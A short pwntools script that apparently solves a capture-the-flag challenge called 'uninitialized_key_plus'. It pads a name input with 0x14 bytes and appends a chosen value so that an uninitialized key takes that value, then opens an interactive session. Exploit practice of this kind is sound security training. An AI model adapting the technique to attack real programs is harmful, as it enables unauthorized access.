#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./uninitialized_key_plus')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
name = b'a' * 0x14 + b'\x52\xbf\x01\x00'
io.sendlineafter(b"input your name:", name)

#p()
io.sendlineafter(b"r key:", b'q')


io.interactive()

